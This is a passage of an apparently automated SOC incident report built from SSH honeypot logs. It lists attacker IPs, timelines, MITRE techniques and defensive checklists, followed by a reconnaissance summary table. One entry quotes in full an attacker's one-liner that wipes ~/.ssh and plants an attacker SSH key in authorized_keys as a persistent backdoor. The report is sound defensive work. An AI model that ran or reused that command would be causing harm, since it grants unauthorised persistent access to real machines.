- [ ] Submit `203.193.147[.]75` to AbuseIPDB if not already reported
- [ ] Block `203.193.147[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d4882afb898

| Field | Detail |
|---|---|
| **Source IP** | `107.180.88[.]176` |
| **First Seen** | 2026-08-14 08:13 |
| **Last Seen** | 2026-08-14 08:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:13:23` | `cowrie.session.connect` |
| `2026-08-14 08:13:23` | `cowrie.client.version` |
| `2026-08-14 08:13:23` | `cowrie.client.kex` |
| `2026-08-14 08:13:24` | `cowrie.login.success` |
| `2026-08-14 08:13:24` | `cowrie.session.params` |
| `2026-08-14 08:13:24` | `cowrie.command.input` |
| `2026-08-14 08:13:24` | `cowrie.command.failed` |
| `2026-08-14 08:13:25` | `cowrie.log.closed` |
| `2026-08-14 08:13:25` | `cowrie.session.params` |
| `2026-08-14 08:13:25` | `cowrie.command.input` |
| `2026-08-14 08:13:25` | `cowrie.session.file_download` |
| `2026-08-14 08:13:25` | `cowrie.log.closed` |
| `2026-08-14 08:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.180.88[.]176` to AbuseIPDB if not already reported
- [ ] Block `107.180.88[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8320c1f892dd

| Field | Detail |
|---|---|
| **Source IP** | `107.180.88[.]176` |
| **First Seen** | 2026-08-14 08:13 |
| **Last Seen** | 2026-08-14 08:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:13:25` | `cowrie.session.connect` |
| `2026-08-14 08:13:25` | `cowrie.client.version` |
| `2026-08-14 08:13:25` | `cowrie.client.kex` |
| `2026-08-14 08:13:26` | `cowrie.login.success` |
| `2026-08-14 08:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.180.88[.]176` to AbuseIPDB if not already reported
- [ ] Block `107.180.88[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f1723601c7d

| Field | Detail |
|---|---|
| **Source IP** | `107.180.88[.]176` |
| **First Seen** | 2026-08-14 08:13 |
| **Last Seen** | 2026-08-14 08:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:13:26` | `cowrie.session.connect` |
| `2026-08-14 08:13:26` | `cowrie.client.version` |
| `2026-08-14 08:13:26` | `cowrie.client.kex` |
| `2026-08-14 08:13:26` | `cowrie.login.success` |
| `2026-08-14 08:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.180.88[.]176` to AbuseIPDB if not already reported
- [ ] Block `107.180.88[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05bac1b31db5

| Field | Detail |
|---|---|
| **Source IP** | `220.189.209[.]18` |
| **First Seen** | 2026-08-14 08:13 |
| **Last Seen** | 2026-08-14 08:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:13:35` | `cowrie.session.connect` |
| `2026-08-14 08:13:35` | `cowrie.client.version` |
| `2026-08-14 08:13:35` | `cowrie.client.kex` |
| `2026-08-14 08:13:37` | `cowrie.login.success` |
| `2026-08-14 08:13:39` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.209[.]18` to AbuseIPDB if not already reported
- [ ] Block `220.189.209[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ed5a63b7a97

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-14 08:13 |
| **Last Seen** | 2026-08-14 08:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:13:44` | `cowrie.session.connect` |
| `2026-08-14 08:13:44` | `cowrie.client.version` |
| `2026-08-14 08:13:44` | `cowrie.client.kex` |
| `2026-08-14 08:13:45` | `cowrie.login.success` |
| `2026-08-14 08:13:45` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804830a6786f

| Field | Detail |
|---|---|
| **Source IP** | `85.152.57[.]60` |
| **First Seen** | 2026-08-14 08:24 |
| **Last Seen** | 2026-08-14 08:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:24:02` | `cowrie.session.connect` |
| `2026-08-14 08:24:03` | `cowrie.client.version` |
| `2026-08-14 08:24:03` | `cowrie.client.kex` |
| `2026-08-14 08:24:03` | `cowrie.login.success` |
| `2026-08-14 08:24:04` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.152.57[.]60` to AbuseIPDB if not already reported
- [ ] Block `85.152.57[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51500bce6ef8

| Field | Detail |
|---|---|
| **Source IP** | `223.197.145[.]33` |
| **First Seen** | 2026-08-14 08:24 |
| **Last Seen** | 2026-08-14 08:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:24:09` | `cowrie.session.connect` |
| `2026-08-14 08:24:09` | `cowrie.client.version` |
| `2026-08-14 08:24:09` | `cowrie.client.kex` |
| `2026-08-14 08:24:11` | `cowrie.login.success` |
| `2026-08-14 08:24:12` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.145[.]33` to AbuseIPDB if not already reported
- [ ] Block `223.197.145[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4cecafdd261

| Field | Detail |
|---|---|
| **Source IP** | `59.120.8[.]61` |
| **First Seen** | 2026-08-14 08:24 |
| **Last Seen** | 2026-08-14 08:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:24:44` | `cowrie.session.connect` |
| `2026-08-14 08:24:44` | `cowrie.client.version` |
| `2026-08-14 08:24:44` | `cowrie.client.kex` |
| `2026-08-14 08:24:46` | `cowrie.login.success` |
| `2026-08-14 08:24:46` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.120.8[.]61` to AbuseIPDB if not already reported
- [ ] Block `59.120.8[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7430aa3501a9

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-08-14 08:24 |
| **Last Seen** | 2026-08-14 08:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:24:51` | `cowrie.session.connect` |
| `2026-08-14 08:24:51` | `cowrie.client.version` |
| `2026-08-14 08:24:51` | `cowrie.client.kex` |
| `2026-08-14 08:24:53` | `cowrie.login.success` |
| `2026-08-14 08:24:53` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-635ce5615a36

| Field | Detail |
|---|---|
| **Source IP** | `117.205.2[.]250` |
| **First Seen** | 2026-08-14 08:31 |
| **Last Seen** | 2026-08-14 08:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:31:24` | `cowrie.session.connect` |
| `2026-08-14 08:31:24` | `cowrie.client.version` |
| `2026-08-14 08:31:24` | `cowrie.client.kex` |
| `2026-08-14 08:31:26` | `cowrie.login.success` |
| `2026-08-14 08:31:27` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.2[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.205.2[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-359d18c3af16

| Field | Detail |
|---|---|
| **Source IP** | `95.79.57[.]221` |
| **First Seen** | 2026-08-14 08:36 |
| **Last Seen** | 2026-08-14 08:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:36:29` | `cowrie.session.connect` |
| `2026-08-14 08:36:29` | `cowrie.client.version` |
| `2026-08-14 08:36:29` | `cowrie.client.kex` |
| `2026-08-14 08:36:30` | `cowrie.login.success` |
| `2026-08-14 08:36:30` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.57[.]221` to AbuseIPDB if not already reported
- [ ] Block `95.79.57[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3931a1bd20

| Field | Detail |
|---|---|
| **Source IP** | `85.105.2[.]51` |
| **First Seen** | 2026-08-14 08:36 |
| **Last Seen** | 2026-08-14 08:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:36:35` | `cowrie.session.connect` |
| `2026-08-14 08:36:35` | `cowrie.client.version` |
| `2026-08-14 08:36:35` | `cowrie.client.kex` |
| `2026-08-14 08:36:36` | `cowrie.login.success` |
| `2026-08-14 08:36:36` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.2[.]51` to AbuseIPDB if not already reported
- [ ] Block `85.105.2[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeb24996e56c

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-08-14 08:38 |
| **Last Seen** | 2026-08-14 08:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:38:41` | `cowrie.session.connect` |
| `2026-08-14 08:38:42` | `cowrie.client.version` |
| `2026-08-14 08:38:42` | `cowrie.client.kex` |
| `2026-08-14 08:38:43` | `cowrie.login.success` |
| `2026-08-14 08:38:43` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c44a67f7c581

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-14 08:38 |
| **Last Seen** | 2026-08-14 08:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:38:48` | `cowrie.session.connect` |
| `2026-08-14 08:38:49` | `cowrie.client.version` |
| `2026-08-14 08:38:49` | `cowrie.client.kex` |
| `2026-08-14 08:38:51` | `cowrie.login.success` |
| `2026-08-14 08:38:51` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17172321189e

| Field | Detail |
|---|---|
| **Source IP** | `178.216.165[.]187` |
| **First Seen** | 2026-08-14 08:41 |
| **Last Seen** | 2026-08-14 08:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:41:13` | `cowrie.session.connect` |
| `2026-08-14 08:41:14` | `cowrie.client.version` |
| `2026-08-14 08:41:14` | `cowrie.client.kex` |
| `2026-08-14 08:41:15` | `cowrie.login.success` |
| `2026-08-14 08:41:15` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.216.165[.]187` to AbuseIPDB if not already reported
- [ ] Block `178.216.165[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d26763147ba3

| Field | Detail |
|---|---|
| **Source IP** | `122.160.85[.]144` |
| **First Seen** | 2026-08-14 08:41 |
| **Last Seen** | 2026-08-14 08:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:41:21` | `cowrie.session.connect` |
| `2026-08-14 08:41:21` | `cowrie.client.version` |
| `2026-08-14 08:41:21` | `cowrie.client.kex` |
| `2026-08-14 08:41:24` | `cowrie.login.success` |
| `2026-08-14 08:41:24` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.85[.]144` to AbuseIPDB if not already reported
- [ ] Block `122.160.85[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cf736c0ab0d

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-08-14 08:41 |
| **Last Seen** | 2026-08-14 08:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:41:27` | `cowrie.session.connect` |
| `2026-08-14 08:41:28` | `cowrie.client.version` |
| `2026-08-14 08:41:28` | `cowrie.client.kex` |
| `2026-08-14 08:41:30` | `cowrie.login.success` |
| `2026-08-14 08:41:31` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:41:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51aec054ffe6

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-08-14 08:41 |
| **Last Seen** | 2026-08-14 08:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:41:36` | `cowrie.session.connect` |
| `2026-08-14 08:41:37` | `cowrie.client.version` |
| `2026-08-14 08:41:37` | `cowrie.client.kex` |
| `2026-08-14 08:41:39` | `cowrie.login.success` |
| `2026-08-14 08:41:40` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710c14cb1182

| Field | Detail |
|---|---|
| **Source IP** | `122.187.147[.]13` |
| **First Seen** | 2026-08-14 08:43 |
| **Last Seen** | 2026-08-14 08:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:43:59` | `cowrie.session.connect` |
| `2026-08-14 08:43:59` | `cowrie.client.version` |
| `2026-08-14 08:43:59` | `cowrie.client.kex` |
| `2026-08-14 08:44:02` | `cowrie.login.success` |
| `2026-08-14 08:44:03` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.147[.]13` to AbuseIPDB if not already reported
- [ ] Block `122.187.147[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64b0caee0423

| Field | Detail |
|---|---|
| **Source IP** | `114.33.12[.]13` |
| **First Seen** | 2026-08-14 08:46 |
| **Last Seen** | 2026-08-14 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, shell, enable, system, ping; sh` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:46:46` | `cowrie.session.connect` |
| `2026-08-14 08:46:47` | `cowrie.login.success` |
| `2026-08-14 08:46:48` | `cowrie.session.params` |
| `2026-08-14 08:46:48` | `cowrie.command.input` |
| `2026-08-14 08:46:48` | `cowrie.command.input` |
| `2026-08-14 08:46:48` | `cowrie.command.failed` |
| `2026-08-14 08:46:48` | `cowrie.command.input` |
| `2026-08-14 08:46:48` | `cowrie.command.failed` |
| `2026-08-14 08:46:48` | `cowrie.command.input` |
| `2026-08-14 08:46:48` | `cowrie.command.failed` |
| `2026-08-14 08:46:48` | `cowrie.command.input` |
| `2026-08-14 08:46:48` | `cowrie.command.input` |
| `2026-08-14 08:46:48` | `cowrie.command.input` |
| `2026-08-14 08:46:48` | `cowrie.command.success` |
| `2026-08-14 08:46:48` | `cowrie.log.closed` |
| `2026-08-14 08:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.33.12[.]13` to AbuseIPDB if not already reported
- [ ] Block `114.33.12[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44eaa477eb41

| Field | Detail |
|---|---|
| **Source IP** | `220.93.167[.]144` |
| **First Seen** | 2026-08-14 08:47 |
| **Last Seen** | 2026-08-14 08:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:47:27` | `cowrie.session.connect` |
| `2026-08-14 08:47:28` | `cowrie.client.version` |
| `2026-08-14 08:47:28` | `cowrie.client.kex` |
| `2026-08-14 08:47:32` | `cowrie.login.success` |
| `2026-08-14 08:47:33` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.93.167[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.93.167[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f47815845516

| Field | Detail |
|---|---|
| **Source IP** | `150.117.7[.]72` |
| **First Seen** | 2026-08-14 08:47 |
| **Last Seen** | 2026-08-14 08:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:47:39` | `cowrie.session.connect` |
| `2026-08-14 08:47:40` | `cowrie.client.version` |
| `2026-08-14 08:47:40` | `cowrie.client.kex` |
| `2026-08-14 08:47:42` | `cowrie.login.success` |
| `2026-08-14 08:47:43` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.117.7[.]72` to AbuseIPDB if not already reported
- [ ] Block `150.117.7[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **6** | 2026-08-14 07:02 | 2026-08-14 08:46 | 3m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-08-14 08:15 | 2026-08-14 08:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-14 07:10 | 2026-08-14 08:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **4** | 2026-08-14 08:11 | 2026-08-14 08:54 | 2m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-08-14 07:39 | 2026-08-14 07:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-08-14 08:05 | 2026-08-14 08:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `212.12.150[.]68` | **2** | 2026-08-14 07:28 | 2026-08-14 07:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `48.217.64[.]148` | **2** | 2026-08-14 08:48 | 2026-08-14 08:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]186` | **2** | 2026-08-14 08:41 | 2026-08-14 08:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-08-14 07:06 | 2026-08-14 07:07 | 46s | 0 | `T1592` | 🟢 LOW |
| `121.22.99[.]2` | 1 | 2026-08-14 07:01 | 2026-08-14 07:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.187.227[.]152` | 1 | 2026-08-14 08:07 | 2026-08-14 08:07 | 5s | 0 | `T1592` | 🟢 LOW |
| `122.199.107[.]20` | 1 | 2026-08-14 08:45 | 2026-08-14 08:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `124.133.10[.]66` | 1 | 2026-08-14 07:02 | 2026-08-14 07:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-08-14 07:37 | 2026-08-14 07:38 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `155.4.209[.]51` | 1 | 2026-08-14 08:31 | 2026-08-14 08:33 | 120s | 0 | `T1592` | 🟢 LOW |
